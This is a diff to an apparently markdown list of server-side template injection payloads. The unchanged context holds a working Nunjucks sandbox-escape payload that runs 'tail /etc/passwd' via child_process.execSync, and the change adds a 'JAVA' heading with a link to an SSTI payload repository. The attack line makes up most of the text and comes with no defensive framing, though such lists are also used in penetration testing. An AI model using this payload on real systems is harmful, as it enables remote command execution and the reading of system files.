@@ -20,3 +20,6 @@ http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
 ```
 
+
+## JAVA
+https://github.com/VikasVarshney/ssti-payload
